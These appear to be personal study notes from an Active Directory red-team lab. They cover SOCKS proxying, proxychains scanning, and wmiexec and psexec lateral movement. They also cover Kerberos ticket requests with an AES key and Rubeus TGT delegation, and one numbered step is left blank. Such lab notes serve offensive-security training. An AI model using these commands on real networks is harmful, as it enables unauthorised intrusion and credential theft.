# Pivoting Notes

**SOCKS**

start a SOCKS4a proxy, second is SOCKS5
```
socks 1080
socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
```

**Linux Tools**

**proxychains**

```
sudo vim /etc/proxychains.conf
  socks4 127.0.0.1 9050
  socks5 127.0.0.1 1080 myUser myPassword
proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
proxychains wmiexec.py DEV/jking@10.10.122.30
```

**pivoting with kerberos**

```
proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
export KRB5CCNAME=jking.ccache
proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```

using a TGT delegation trick to get a usable TGT for bfarmer from a non-elevated session
1. delegate TGT to get a TGT for a non-elevated session
2. 

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi
```
